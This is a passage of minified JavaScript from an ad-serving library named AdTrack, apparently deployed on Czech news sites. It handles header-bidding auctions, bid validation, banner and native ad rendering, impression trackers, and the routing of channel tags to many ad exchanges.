          var a = -1 !== n.search("branding") && (-1 !== n.search("ihned.cz") || -1 !== n.search("centrum.cz") || -1 !== n.search("aktualne.cz")) && !i,
            o = "fixed2" === i && "classic_podnikatel.cz_article_fixed" === n,
            d = "collision" === i && ("classic_idnes.cz_generic_fixed" === n || "classic_idnes.cz_homepage_fixed" === n),
            c = -1 !== t.indexOf("passback") && ("classic_zpravy.idnes.cz_rtb-premium-article_480x300" === n || "classic_zpravy.idnes.cz_rtb-article_480x300" === n || "classic_zpravy.idnes.cz_article_480x300" === n || "classic_idnes.cz_rtb-premium-hp_interscroller" === n || "classic_idnes.cz_homepage_interscroller" === n),
            h = -1 !== t.indexOf("interscroller orientation") && ("classic_idnes.cz_rtb-premium-hp_interscroller" === n || "classic_idnes.cz_homepage_interscroller" === n),
            l = "cnc debug" === i && ("classic_mojezdravi.cz_hb_300x600" === n || "cnc" === s && -1 !== n.indexOf("branding"));
          (a || o || c || d || h || "opacity" === i && "optimanetwork" === s || "DFP vignette" === i && ("mobile_parlamentnilisty.cz_generic_vignette" === n || "mobile_ii.zdravi.euro.cz_generic_vignette" === n || "mobile_expres.cz_generic_vignette" === n) || "vignetteTrigger" === i || "schain" === i || "prebid" === i || l) && "function" == typeof e.doProfiling && e.doProfiling("v8-" + t, AdTrack.Utils.time() - r);
        }
      };
    return a;
  };
}, function (t, e) {
  AdTrack.NTHB = function (t, e, i, r, n, s) {
    var a = [],
      o = [],
      d = 0,
      c = !0,
      h = !1,
      l = !1,
      u = !1,
      p = 0,
      f = 0,
      g = 0,
      m = 0,
      k = {
        getBids: function () {
          return a;
        },
        getHBWinner: function () {
          for (var t = 0; t < a.length; t++) if (!a[t].nonHb) return a[t];
        },
        served: function () {
          h = !0;
        },
        isRefreshing: function () {
          return h;
        },
        hasOnlyValid: function () {
          return p > 0 && c;
        },
        getBidCount: function () {
          return p;
        },
        getDisplayed: function () {
          return o;
        },
        getPass: function () {
          return n;
        },
        isEmpty: function () {
          return 0 === a.length;
        },
        hasValidBids: function () {
          return m > 0;
        }
      };
    return k.addBid = function (t) {
      !u && t && t.getAuctionPrice() && (t.isValid() ? (g++, m++, l || (l = !0)) : c = !1, function (t) {
        if (a.length > 0) for (var e = 0; e < a.length; e++) {
          if (t.isHigherThan(a[e])) {
            a.splice(e, 0, t);
            break;
          }
          if (t.getAuctionPrice() === a[e].getAuctionPrice() && t.getIndex() < a[e].getIndex()) {
            a.splice(e, 0, t);
            break;
          }
          if (e === a.length - 1) {
            a.push(t);
            break;
          }
        } else a.push(t);
      }(t), t.nonHb ? f++ : (p++, d += t.getAuctionPrice()));
    }, k.getNext = function (t) {
      var n;
      if (t) {
        for (var d, c = 0; c < a.length; c++) if (a[c].isValid() || a[c].nonHb) {
          d = c;
          break;
        }
        void 0 !== d && (n = a.splice(d, 1)[0]);
      } else n = a.shift();
      return n && (n.isValid() && m--, n.nonHb ? 0 : (o.push(n), "function" == typeof i.doNTHBDisplay && i.doNTHBDisplay(e, o.length, n.getAuctionPrice(), r, s))), n;
    }, k.getId = function () {
      return t;
    }, k.end = function () {
      u = !0, p && "function" == typeof i.doNTHBAuction && i.doNTHBAuction(e, l, p, d, r, s);
      for (var t = !1, n = !1, o = 0; o < a.length; o++) {
        var c = a[o];
        n || (c.nonHb ? (n = !0, f > 1 && (c.beatNhb = !0)) : f > 0 && c.isValid() && (c.beatNhb = !0)), t || (c.nonHb ? g > 0 && (c.beatHb = !0) : c.isValid() && (t = !0, g > 1 && (c.beatHb = !0)));
      }
    }, k;
  };
}, function (t, e) {
  AdTrack.NTHB.Bid = function (t, e, i, r, n, s) {
    if (this.channel = t, this.channel.nthbBid = this, this.wfChannel = e, this.price = r, this.index = i, this.nonHb = e.chd && "tag" === e.chd.type, this.beatHb = !1, this.beatNhb = !1, r && !this.nonHb) {
      var a = r.isDeal();
      r.setFactor(a ? e.factorFixed : e.factor);
      var o = r.getPrice(),
        d = e.sfc || 1,
        c = s ? n : e.floor * d;
      c = c || 0, this.valid = o && (o >= c || a || r.noFP);
    } else this.valid = !1;
    this.isValid = function () {
      return this.valid, this.valid;
    }, this.isNonHb = function () {
      return this.nonHb;
    }, this.isDeal = function () {
      return this.price && this.price.isDeal();
    }, this.getChannel = function () {
      return this.channel;
    }, this.getWfChannel = function () {
      return this.wfChannel;
    }, this.getBeatHb = function () {
      return this.beatHb;
    }, this.getBeatNhb = function () {
      return this.beatNhb;
    }, this.setBeatHb = function () {
      this.beatHb = !0;
    }, this.setBeatNhb = function () {
      this.beatNhb = !0;
    }, this.getStyles = function () {
      return this.wfChannel.styles;
    }, this.getIndex = function () {
      return this.index;
    }, this.getAuctionPrice = function () {
      return this.price ? this.price.getPrice() : 0;
    }, this.isHigherThan = function (t) {
      if (this.price && t.price) {
        var e = this.getAuctionPrice() > t.getAuctionPrice(),
          i = this.getChannel().chd.dealPriority && this.isDeal(),
          r = t.getChannel().chd.dealPriority && t.isDeal();
        return this.nonHb || t.nonHb ? e : r ? i && e : i || e;
      }
      return !!this.price;
    };
  };
}, function (t, e) {
  var i;
  AdTrack.MediaTypes = AdTrack.MediaTypes || (i = {
    createVideoSettings: function (t, e, r, n) {
      return i.createVideoSettingsRefactored(t.definition, e, r, n, t.server);
    },
    createVideoSettingsRefactored: function (t, e, i, r, n) {
      var s = t.options.player;
      return {
        chd: e,
        ad: {
          type: r,
          data: i
        },
        options: {
          skipTime: s && s.skipTime ? s.skipTime : 0,
          skipCaption: s && s.skipCaption ? s.skipCaption : "Přeskočit reklamu"
        },
        server: n
      };
    },
    createNativeSettings: function (t, e, i) {
      return {
        chd: t,
        ad: {
          type: "tcproxy",
          data: {
            adSet: e,
            tc: i
          }
        },
        style: e.getStyle(),
        count: e.getAdsCount()
      };
    }
  }), AdTrack.MediaTypes.Base = function (t, e) {
    this.id = "adtrack-ad-" + Math.floor(1e4 * Math.random()), this.data = t || {}, this.preloaded = t.preload, this.debug = !!t.debug, this.externalRender = t.externalRender, this.passedResponse = null, this.errorReporting = e, this.errorStatus = !1, this.rendered = !1, this.isLoaded = !1, this.preloadDone = !1, this.timedOut = !1, this.passbackReason = "", this.events = AdTrack.Events.create(["load", "preloadDone", "adLoad", "error", "close", "click", "beforeClick", "end", "beforeRender", "destroy"]), this.events.markEventAsTriggerOnce("load"), this.events.markEventAsTriggerOnce("adLoad"), this.events.markEventAsTriggerOnce("error"), this.events.markEventAsTriggerOnce("close"), this.events.markEventAsTriggerOnce("end"), this.events.markEventAsTriggerOnce("destroy"), this.events.markEventAsTriggerOnce("preloadDone");
  }, AdTrack.MediaTypes.Base.prototype = {
    on: function (t, e) {
      this.events.addCallback(t, e);
    },
    trigger: function (t, e) {
      this.events.trigger(t, e);
    },
    finishPreload: function (t) {
      if (this.isPreloaded() && !this.preloadDone) {
        this.preloadDone = !0;
        var e = 0;
        this.preloadStart && (e = window.performance.now() - this.preloadStart), this.trigger("preloadDone", [!!t, this.timedOut, e]);
      }
    },
    isPreloaded: function () {
      return this.preloaded;
    },
    isDebug: function () {
      return this.debug;
    },
    isRenderedExternally: function () {
      return this.externalRender;
    },
    getStyle: function () {
      return this.data.style;
    },
    getCount: function () {
      return this.data.count;
    },
    getImpThreshold: function () {
      return this.data.impThreshold;
    },
    getPassedResponse: function () {
      return this.passedResponse;
    },
    passResponse: function (t) {
      this.passedResponse = t;
    },
    getPassbackReason: function () {
      if (this.isPreloaded() && this.passbackReason) return this.passbackReason;
    },
    setPassbackReason: function (t) {
      this.isPreloaded() && t && "string" == typeof t && (this.passbackReason = t);
    },
    adLoaded: function () {
      this.isPreloaded() && (this.finishPreload(!0), this.data.preload.delayLoad ? this.trigger("adLoad") : this.loaded());
    },
    render: function (t, e) {
      "function" == typeof this.handleRender ? (this.validate(), this.errorStatus || this.rendered || (this.trigger("beforeRender", [t]), this.rendered = !0, this.data.wrapAd && (t = this.wrap(t, this.data.wrapAd)), this.handleRender(t, e), this.loaded())) : this.error("No handler for render");
    },
    preload: function (t, e) {
      "function" == typeof this.handlePreload ? (this.validate(), this.errorStatus || this.rendered || (this.trigger("beforeRender", [t]), this.rendered = !0, this.data.wrapAd && (t = this.wrap(t, this.data.wrapAd)), this.data.preload.proxy && ((t = this.wrap(t, "proxy" + Math.floor(1e5 * Math.random()))).setAttribute("style", "visibility: hidden !important;position: fixed !important;"), this.preloadProxy = t), window.performance && window.performance.now && (this.preloadStart = window.performance.now()), this.handlePreload(t, e))) : this.error("No handler for preload");
    },
    validate: function () {
      "function" == typeof this.handleData && (this.data = this.handleData(this.data));
    },
    wrap: function (t, e) {
      var i = "string" == typeof e ? e : AdTrack.Utils.randomString("w"),
        r = document.createElement("div");
      return r.setAttribute("id", i), t.appendChild(r), r;
    },
    loaded: function () {
      if (!this.errorStatus) {
        if (this.isLoaded = !0, this.finishPreload(!0), this.preloadProxy && this.preloadProxy.setAttribute("style", ""), this.data.impTrackers && this.data.impTrackers.length > 0 && this.data.impTrackers.forEach(function (t) {
          try {
            new Image().src = t;
          } catch (t) {
            this.errorReporting.doError("Unable to call impTracker: " + t.message);
          }
        }.bind(this)), this.data.jsTrackers && this.element) try {
          this.element.id || (this.element.id = this.id);
          var t = function (t) {
            "string" == typeof t && AdTrack.Utils.useJsTracker(t, this.element);
          }.bind(this);
          "string" == typeof this.data.jsTrackers ? t(this.data.jsTrackers) : "[object Array]" === Object.prototype.toString.call(this.data.jsTrackers) && this.data.jsTrackers.forEach(t);
        } catch (t) {
          this.errorReporting.doError("Unable to call jsTrackers: " + t.message);
        }
        this.trigger("load");
      }
    },
    clicked: function (t, e, i, r) {
      this.trigger("beforeClick", [t, e, i, r]), this.data.clickTrackers && this.data.clickTrackers.length > 0 && this.data.clickTrackers.forEach(function (t) {
        try {
          new Image().src = t;
        } catch (t) {
          this.errorReporting.doError("Unable to call clickTracker: " + t.message);
        }
      }.bind(this)), this.trigger("click", [t, e, i, r]);
    },
    error: function (t) {
      this.errorStatus = !0, this.finishPreload(), t && this.errorReporting.doError(t), this.preloadProxy && this.preloadProxy.parentNode && this.preloadProxy.parentNode.removeChild(this.preloadProxy), this.trigger("error");
    },
    close: function () {
      this.trigger("close");
    },
    destroy: function () {
      this.errorStatus = !0, this.finishPreload(), this.trigger("destroy");
    }
  };
}, function (t, e) {
  var i;
  AdTrack.MediaTypes.Banner = function (t, e) {
    AdTrack.MediaTypes.Base.call(this, t, e), this.element = null;
  }, AdTrack.MediaTypes.Banner.prototype = Object.create(AdTrack.MediaTypes.Base.prototype), AdTrack.MediaTypes.Banner.prototype.constructor = AdTrack.MediaTypes.Banner, (i = AdTrack.MediaTypes.Banner.prototype).getElement = function () {
    return this.element;
  }, i.updateSize = function (t, e) {
    this.data.width = t, this.data.height = e, this.element.style.width = t + "px", this.element.style.height = e + "px", (this.element.width || this.element.height) && (this.element.width = t, this.element.height = e);
  }, i.handleData = function (t) {
    return t.width && t.height || this.error("Banner: Undefined width or height"), t.ad ? (t.ad.type || this.error("Banner: Undefined type"), t.ad.data || this.error("Banner: Undefined data")) : this.error("Banner: Undefined ad source"), t.count = t.count || 1, t.style = t.style || null, t;
  }, i.handleRender = function (t, e) {
    var i,
      r = function () {
        this.clicked();
      }.bind(this);
    return this.data.externalRender ? "content" === this.data.ad.type ? i = AdTrack.iframeCreator.factory.createIframeWithContent(t, 0, 0, window.location.href, this.data.ad.data, null) : "function" === this.data.ad.type && "function" == typeof this.data.ad.data && (i = document.createElement("div"), t.appendChild(i), i.style.width = "0px", i.style.height = "0px", this.data.ad.data(i)) : "content" === this.data.ad.type ? i = AdTrack.iframeCreator.factory.createIframeWithContent(t, this.data.width, this.data.height, window.location.href, this.data.ad.data, r, this.data.fluid) : "iframe" === this.data.ad.type ? i = AdTrack.iframeCreator.factory.createIframeFromHTML(t, this.data.ad.data, r) : "function" === this.data.ad.type && "function" == typeof this.data.ad.data ? (i = document.createElement("div"), t.appendChild(i), i.style.width = this.data.fluid ? "100%" : this.data.width + "px", i.style.height = this.data.fluid ? "auto" : this.data.height + "px", this.data.ad.data(i)) : this.error("Banner: ad type '" + this.data.ad.type + "' not supported."), null === i && this.error("Banner: Error while creating iframe"), this.element = i, e && e.customTransform(function () {
      i.parentNode.removeChild(i);
    }), i;
  }, i.handlePreload = function (t, e) {
    var i = null,
      r = null,
      n = function () {
        i && clearTimeout(i), r && clearInterval(r);
      };
    this.on("load", function () {
      n();
    }), this.on("adLoad", function () {
      n();
    }), this.on("error", function () {
      n();
    }), this.on("destroy", function () {
      n();
    }), i = setTimeout(function () {
      n(), this.timedOut = !0, this.isDebug() || (t.innerHTML = ""), this.error();
    }.bind(this), this.data.preload.timeout || 5e3);
    var s = this.handleRender(t, e);
    this.on("error", function () {
      s && !this.isDebug() && s.parentNode.removeChild(s);
    }.bind(this)), this.data.preload.checkForContent && (!s || "IFRAME" !== s.tagName && "iframe" !== s.tagName ? this.error("checkForContent failed (" + (s ? s.tagName : "missing") + ")") : r = setInterval(function () {
      s && function (t) {
        try {
          var e = t.contentDocument ? t.contentDocument : t.contentWindow.document;
          if (e.getElementsByTagName("object").length > 0) return !0;
          var i = e.getElementsByTagName("img");
          if (i.length > 0) for (var r = 0; r < i.length; r++) {
            var n = i[r];
            if (n.clientWidth > 1 || n.clientHeight > 1 || n.getAttribute("width") > 1 || n.getAttribute("height") > 1) return !0;
          }
          return e.getElementsByTagName("a").length > 0 || !!e.getElementsByTagName("iframe")[0];
        } catch (t) {
          return !0;
        }
      }(s) && this.loaded();
    }.bind(this), this.data.preload.checkInterval || 200));
  };
}, function (t, e) {
  var i;
  AdTrack.MediaTypes.Native = function (t, e) {
    AdTrack.MediaTypes.Base.call(this, t, e), this.player = null, this.element = null;
  }, AdTrack.MediaTypes.Native.prototype = Object.create(AdTrack.MediaTypes.Base.prototype), AdTrack.MediaTypes.Native.prototype.constructor = AdTrack.MediaTypes.Native, (i = AdTrack.MediaTypes.Native.prototype).handleData = function (t) {
    return t.ad ? (t.ad.type || this.error("Native: Undefined type"), t.ad.data ? (t.ad.data.tc || this.error("Native: Missing text channel proxy"), "structure" === t.ad.type && (t.ad.data.assets || this.error("Native: Undefined assets for native type structure"))) : this.error("Native: Undefined data")) : this.error("Native: Undefined ad source"), t.count || this.error("Native: Missing count"), t.style || this.error("Native: Missing style"), t;
  }, i.getElement = function () {
    return this.element;
  }, i.handleRender = function (t, e) {
    this.element = t, "tcproxy" === this.data.ad.type ? this.data.ad.data.tc.renderAds(t, this.data.ad.data.adSet, this) : "function" === this.data.ad.type && "function" == typeof this.data.ad.data ? this.data.ad.data(t, this) : this.error("Native: ad type '" + this.data.ad.type + "' not supported.");
  }, i.handlePreload = function (t, e) {
    this.handleRender(t, e);
  };
}, function (module, exports) {
  AdTrack.Dispatcher = function (t, e, i, r, n, s, a, o, d) {
    this.version = 13, this.settings = d || {}, !n || "outstream" !== r && "outstream-premium" !== r && "outstream_mini" !== r || (n.renderer = "outstream"), this.time_start = AdTrack.Utils.time(), this.type = t, this.domain = e, this.group = i, this.position = r, this.unitID = AdTrack.ID.createIdDGPT(e, i, r, t), this.status = 0, this.pass = 0, this.t = 0, this.rendered = !1, this.events = [], this.debugMode = !1, this.debugTarget = "AdTrackDebugConsole", this.keywordOrigin = "online", this.processedChannels = [], this.deviceId = null, "track.us.org" != a && "http://track.us.org" != a || (a = "trackad.cz"), this.server = a || "trackad.cz", this.aaproxy = o, this.keywordLogUrl = AdTrack.Config.getKeywordsUrl();
    var c = "online";
    if (n && n.options.environment && (c = n.options.environment), this.environment = c, this.reporting = this.getReporting(c), this.metrics = AdTrack.Metrics.initMetrics(this.unitID, this.reporting, this.settings), this.metrics.startProfiling(), this.errorReporting = AdTrack.Utils.errorReporting(this.server, AdTrack.url, !1, this.unitID), this.pbjValidation = this.createPbjReportingValidation(), this.channelMap = [], "hbbtv" === this.environment && this.errorReporting.doError("Wrong environment"), this.keywordsModule = null, AdTrack.KeywordsModule && (this.keywordsModule = new AdTrack.KeywordsModule(this)), this.jsonpScript = {}, this.evPageView(!1), this.evAdRequest(), AdTrack.Cookies.isHidden(this.unitID, n)) return this.metrics.evUnfilledImp("capping"), void (n && n.options.customRefreshWithCapping && (this.definition = n, this.definition.placementId = this.unitID, this.definitionWrapper = new AdTrack.Definition(n), this.refreshPlacement()));
    if ((this.settings.dummyAds || this.settings.selfpromo) && this.settings.dummyAdsPath && (this.dummyAds = AdTrack.Libs.getLib("adtrack-dummy-js"), !this.dummyAds)) {
      var h = !1;
      n && n.options && n.options.noAsync && (h = !!n.options.noAsync), this.dummyAds = AdTrack.Libs.deploy("adtrack-dummy-js", "//" + this.server + "/" + this.settings.dummyAdsPath, h);
    }
    if (this.definitionWrapper = null, n) {
      if (this.definition = n, this.definition.placementId = this.unitID, this.definitionWrapper = new AdTrack.Definition(n), this.isHB = !!n.options.hb, n.options.noAsync) this.tryToRun(n);else if (this.isHB) try {
        var l = n.options.hb.currency || "USD";
        AdTrack.hb2.setCurrency(l), this.tryToRun(n), setTimeout(function () {
          AdTrack.placementQ.execute(this.unitID);
        }.bind(this), 1);
      } catch (t) {
        this.doError("Error during run placement - " + t.message);
      } else setTimeout(function () {
        this.tryToRun(n), AdTrack.placementQ.execute(this.unitID);
      }.bind(this), 1);
    } else this.getDefinition();
  }, AdTrack.pbUnitsLookUp = AdTrack.pbUnitsLookUp || function () {
    var t,
      e = "",
      i = null,
      r = null,
      n = AdTrack.Events.create(["fastLookUpEnded", "slowLookUpEnded"]);
    n.markEventAsTriggerOnce("fastLookUpEnded"), n.markEventAsTriggerOnce("slowLookUpEnded");
    var s = function (t) {
        return e || (e = t), e !== t && AdTrack.Prebid.error("Settings are inconsistent, multiple adUnits paths (requested '" + t + "', but using '" + e + "')"), AdTrack.Utils.deepAccess(window, e);
      },
      a = function (e, i, r, a) {
        var o = AdTrack.Timer.create(i, function (i) {
          if (t = s(e)) return o.stop(), void n.trigger(a);
          1e3 * i > r && (o.stop(), n.trigger(a));
        });
        return o;
      },
      o = function (e) {
        return function () {
          e(t);
        };
      },
      d = {
        fastLookUp: function (e, r) {
          n.addCallback("fastLookUpEnded", o(r)), (t = t || s(e)) ? n.trigger("fastLookUpEnded") : i || (i = a(e, 50, 500, "fastLookUpEnded")).start();
        },
        slowLookUp: function (e, i) {
          n.addCallback("slowLookUpEnded", o(i)), (t = t || s(e)) ? n.trigger("slowLookUpEnded") : r || (r = a(e, 500, 2e3, "slowLookUpEnded")).start();
        }
      };
    return d.stopLookUp = function (a) {
      (t = t || s(a)) || AdTrack.Prebid.error("Cant find AdUnits '" + e + "'"), i && i.stop(), r && r.stop(), n.trigger("fastLookUpEnded"), n.trigger("slowLookUpEnded");
    }, d;
  }(), AdTrack.Bid = function () {
    this.price = null, this.width = 0, this.height = 0, this.creativeId = null, this.videoVastXML = null, this.videoImpUrl = null;
  }, AdTrack.Bid.prototype = {
    setPrice: function (t) {
      this.price = t;
    },
    setWidth: function (t) {
      this.width = t;
    },
    setHeight: function (t) {
      this.height = t;
    },
    getDimension: function () {
      return {
        width: this.width,
        height: this.height
      };
    },
    getPrice: function () {
      return this.price;
    },
    setVideoVastXML: function (t) {
      this.videoVastXML = t;
    },
    setVideoImpUrl: function (t) {
      this.videoImpUrl = t;
    },
    getVideoVastXML: function () {
      return this.videoVastXML;
    },
    getVideoImpUrl: function () {
      return this.videoImpUrl;
    },
    getCreativeId: function () {
      return this.creativeId;
    },
    setCreativeId: function (t) {
      this.creativeId = t;
    }
  }, AdTrack.Tier = function (t, e, i, r, n) {
    if (this.track = t, this.method = e, this.channels = i, this.tierId = n, this.skippedChannels = r || {}, this.nthb2SkippedChannels = {}, this.errorThreshold = 4e3, this.track.isNTHB2) {
      for (var s = {}, a = {}, o = 0; o < i.length; o++) {
        var d = i[o].chd;
        (d.flag && d.flag.match(/success0/i) ? s : a)[o] = !0;
      }
      void 0 !== this.track.nthbSuccess && Object.keys(s).length > 0 && (this.nthb2SkippedChannels = this.track.nthbSuccess ? s : a);
    }
  }, AdTrack.Tier.prototype = {
    getChannel: function (t, e) {
      var i = e.chd;
      i.textAd = !1;
      var r = e.floor,
        n = 0;
      e.floor && e.factor && (n = e.floor / e.factor, e.bfc && (n *= e.bfc)), i.bidFloor = n;
      var s = this.track.getStyles(e);
      if (s && s.other && (i.balanced = !0), "r2b2" !== i.tag) for (var a in i.keyCounts = {}, i.keys) i.keys.hasOwnProperty(a) && (i.keyCounts[i.keys[a]] = a);
      if ("etarget-cz" == i.tag || "etarget-sk" == i.tag || "etarget-ro" == i.tag) return new AdTrack.EtargetChannel(this.track, t, i);
      if ("etarget-banner" == i.tag) return new AdTrack.EtargetBannerChannel(this.track, t, i);
      if ("etarget-text" == i.tag) return new AdTrack.EtargetTextChannel(this.track, t, i);
      if ("etarget-hb" == i.tag) return new AdTrack.EtargetHbChannel(this.track, t, i);
      if ("adsense" == i.tag) return new AdTrack.AdSenseChannel(this.track, t, i);
      if ("google-dfp" == i.tag) return i.flag && -1 !== i.flag.indexOf("Anchor") ? new AdTrack.GoogleDFPChannelANC(this.track, t, i) : new AdTrack.GoogleDFPChannel(this.track, t, i);
      if ("google-dfp-vgn" == i.tag) return new AdTrack.GoogleDFPChannelVGN(this.track, t, i);
      if ("google-dfp-nf" == i.tag) return new AdTrack.GoogleDFPChannelNF(this.track, t, i);
      if ("bb-rtb" == i.tag) return new AdTrack.BBRTBChannel(this.track, t, i);
      if ("adform" == i.tag || "adform-im" == i.tag) return new AdTrack.AdformOpenRTBChannel(this.track, t, i);
      if ("adform-na-hb" == i.tag || "adform-im-na-hb" == i.tag) return new AdTrack.AdformNAHBChannel(this.track, t, i);
      if ("adform-native-dsp" == i.tag) return new AdTrack.AdformNativeDSPChannel(this.track, t, i);
      if ("adform-hbbtv" == i.tag) return new AdTrack.AdformHbbtvChannel(this.track, t, i);
      if ("adform-js-video" == i.tag) return new AdTrack.AdformOpenRTBVideoChannel(this.track, t, i);
      if ("adform-js-3rd" == i.tag) return new AdTrack.AdformJS3rdChannel(this.track, t, i);
      if ("criteo-banner" == i.tag) return new AdTrack.CriteoBannerChannel(this.track, t, i);
      if ("criteo-hb" == i.tag) return new AdTrack.CriteoHBChannel(this.track, t, i);
      if ("criteo-hb-xhr" == i.tag) return new AdTrack.CriteoHBXHRChannel(this.track, t, i);
      if ("criteo-hb-native" == i.tag) return new AdTrack.CriteoHBNativeChannel(this.track, t, i);
      if ("criteo-hb-xhr-native" == i.tag) return new AdTrack.CriteoHBXHRNativeChannel(this.track, t, i);
      if ("criteo-hb-xhr-video" == i.tag) return new AdTrack.CriteoHBXHRVideoChannel(this.track, t, i);
      if ("appnexus" == i.tag || "appnexus-native" == i.tag) return new AdTrack.AppNexusChannel(this.track, t, i);
      if ("xandr" == i.tag || "xandr-native" == i.tag) return new AdTrack.AppNexusChannel(this.track, t, i);
      if ("rubicon-banner-hb" == i.tag) return new AdTrack.RubiconBannerHBChannel(this.track, t, i);
      if ("rubicon-video-hb" == i.tag) return new AdTrack.RubiconVideoHBChannel(this.track, t, i);
      if ("rubicon-hb-native" == i.tag) return new AdTrack.RubiconHBNativeChannel(this.track, t, i);
      if ("smart-hb" == i.tag) return new AdTrack.SmartAdServerHBChannel(this.track, t, i);
      if ("smart-hb-native" == i.tag) return new AdTrack.SmartAdServerHBNativeChannel(this.track, t, i);
      if ("smart-hb-outstream" == i.tag) return new AdTrack.SmartHBOutstreamChannel(this.track, t, i);
      if ("smart-hb-video" == i.tag) return new AdTrack.SmartHBVideoChannel(this.track, t, i);
      if ("connectad" == i.tag) return new AdTrack.ConnectAdChannel(this.track, t, i);
      if ("vast-video" == i.tag) return new AdTrack.VastVideoChannel(this.track, t, i);
      if ("dfp-js-video" == i.tag) return new AdTrack.DFPJSVideoChannel(this.track, t, i);
      if ("teads-hb" == i.tag) return new AdTrack.TeadsHBChannel(this.track, t, i);
      if ("seznam-ssp-banner" == i.tag || "seznam-ssp-text" == i.tag || "seznam-ssp" == i.tag || "seznam-ssp-branding" == i.tag) {
        var o = new AdTrack.SeznamSspChannel(this.track, t, i);
        return o.setFloorPrice({
          value: r,
          currency: AdTrack.Price.CZK
        }), o;
      }
      return "seznam-ssp-hb" == i.tag || "seznam-ssp-branding-hb" == i.tag ? new AdTrack.SeznamSspHbChannel(this.track, t, i) : "seznam-ssp-hb2" == i.tag || "seznam-ssp-branding-hb2" == i.tag ? new AdTrack.SeznamSspHb2Channel(this.track, t, i) : "stroeer-banner" == i.tag ? new AdTrack.StroeerHbChannel(this.track, t, i) : "stroeer-outstream" == i.tag ? new AdTrack.StroeerOutstreamChannel(this.track, t, i) : "r2b2" == i.tag ? new AdTrack.R2B2Channel(this.track, t, i) : "mgid-hb" == i.tag ? new AdTrack.MgidHBChannel(this.track, t, i) : "mgid-hb-native" == i.tag ? new AdTrack.MgidHBNativeChannel(this.track, t, i) : "pubmatic-hb" == i.tag ? new AdTrack.PubmaticHBChannel(this.track, t, i) : "pubmatic-hb-outstream" == i.tag ? new AdTrack.PubmaticHBOutstreamChannel(this.track, t, i) : "pubmatic-hb-native" == i.tag ? new AdTrack.PubmaticHBNativeChannel(this.track, t, i) : "smartyads-hb" == i.tag ? new AdTrack.SmartyAdsHBChannel(this.track, t, i) : "amazon" == i.tag ? new AdTrack.AmazonChannel(this.track, t, i) : "onetag" == i.tag ? new AdTrack.OneTagChannel(this.track, t, i) : "decenterads-hb" == i.tag ? new AdTrack.DecenterAdsHBChannel(this.track, t, i) : "moneytizer" == i.tag ? new AdTrack.MoneytizerChannel(this.track, t, i) : "reklamstore" == i.tag ? new AdTrack.ReklamStoreChannel(this.track, t, i) : "adagio-hb" == i.tag ? new AdTrack.AdagioHBChannel(this.track, t, i) : "adagio-hb-native" == i.tag ? new AdTrack.AdagioHBNativeChannel(this.track, t, i) : "between-hb" == i.tag ? new AdTrack.BetweenHBChannel(this.track, t, i) : "seedtag-hb" == i.tag ? new AdTrack.SeedtagHbChannel(this.track, t, i) : "adaptmx-hb" == i.tag ? new AdTrack.AdaptMxHBChannel(this.track, t, i) : "adaptmx-hb-outstream" == i.tag ? new AdTrack.AdaptMxHBOutstreamChannel(this.track, t, i) : "wpartner-hb" == i.tag ? new AdTrack.WPartnerHbChannel(this.track, t, i) : "wpartner-hb-native" == i.tag ? new AdTrack.WPartnerHbNativeChannel(this.track, t, i) : "admixer-hb" == i.tag ? new AdTrack.AdmixerHBChannel(this.track, t, i) : "strossle" == i.tag ? new AdTrack.StrossleChannel(this.track, t, i) : "engerio" == i.tag ? new AdTrack.EngerioChannel(this.track, t, i) : "selfpromo" == i.tag || "selfpromo-outstream" == i.tag ? new AdTrack.SelfpromoChannel(this.track, t, i) : "vidoomy-hb" == i.tag ? new AdTrack.VidoomyHBChannel(this.track, t, i) : "taboola-native" == i.tag ? new AdTrack.TaboolaNativeChannel(this.track, t, i) : "smilewanted-hb" == i.tag ? new AdTrack.SmileWantedHbChannel(this.track, t, i) : "9media-hb-outstream" == i.tag ? new AdTrack._9MediaHBOutstreamChannel(this.track, t, i) : "yahoo-hb" == i.tag ? new AdTrack.YahooHbChannel(this.track, t, i) : "adxpremium-hb" == i.tag ? new AdTrack.AdxpremiumHbChannel(this.track, t, i) : "360yield-hb" == i.tag ? new AdTrack._360YieldHbChannel(this.track, t, i) : "rtbhouse-hb" == i.tag ? new AdTrack.RTBHouseHBChannel(this.track, t, i) : "rtbhouse-hb-native" == i.tag ? new AdTrack.RTBHouseHBNativeChannel(this.track, t, i) : "taboola-hb" == i.tag ? new AdTrack.AppNexusChannel(this.track, t, i) : "bidscube-hb" == i.tag ? new AdTrack.BidscubeHbChannel(this.track, t, i) : "incrementx-hb" == i.tag ? new AdTrack.IncrementXHbChannel(this.track, t, i) : "eplanning-hb" == i.tag ? new AdTrack.EPlanningHbChannel(this.track, t, i) : (this.track.doError("Unknown ad channel " + i.tag), null);
    },
    run: function (t, e, i) {
      var r = function (t, e, i, r) {
        r && AdTrack.UserID && "function" == typeof AdTrack.UserID.getBinary && (r.uib = AdTrack.UserID.getBinary()), this.track.evBidRequest(t, e, i, r.uib), function (t, e) {
          e.pending = !0;
          var i = function (t, e) {
            e.pending && this.track.evTimeout(t, e);
          }.bind(this);
          setTimeout(function () {
            i(t, e);
          }, this.errorThreshold);
        }.bind(this)(t, e);
      }.bind(this);
      try {
        if (t.options.dfpVignette = !1, this.callback = e, this.definition = t, "split" == this.method) {
          for (var n = 0, s = [], a = 0; a < this.channels.length; a++) {
            var o = Math.round(100 * this.channels[a].weight);
            this.skippedChannels[a] || this.nthb2SkippedChannels[a] ? s[a] = [1, 0] : (s[a] = [n, n + o], n += o);
          }
          if (0 == n) return this.track.passback(this.definition, null), null;
          for (var d = Math.random() * n, c = 0, h = 0; h < s.length; h++) if (d >= s[h][0] && d < s[h][1]) {
            c = h;
            break;
          }
          this.track.t = c;
          var l = this.track.getChannelCount(this.channels[c].chd.keys),
            u = this.getChannel(t, this.channels[c]);
          this.channels[c].chd && "google-dfp-vgn" === this.channels[c].chd.tag ? (t.options.dfpVignette = !0, r(t, this.channels[c].chd, l, u)) : this.track.renderer.on("ready", function () {
            r(t, this.channels[c].chd, l, u);
          }.bind(this)), this.callback(u, this.track.getStyles(this.channels[c]));
        } else if ("hb" == this.method) {
          this.timeout = AdTrack.Config.getAuctionTimeout(), this.requestStarts = [], this.hbId = Math.floor(1e5 * Math.random()), this.hbChannels = [], this.hbResponses = 0, this.hbSkipped = 0, this.hbEvaluated = !1, this.hbStart = new Date().getTime(), this.hbTimeouted = !1, this.hbEvalForced = !1, this.hasResponse = !1, this.minFP = 0;
          for (var p = 0; p < this.channels.length; p++) {
            var f = this.channels[p];
            if (!f.chd || !f.chd.type || "bid" === f.chd.type) {
              var g = f.floor;
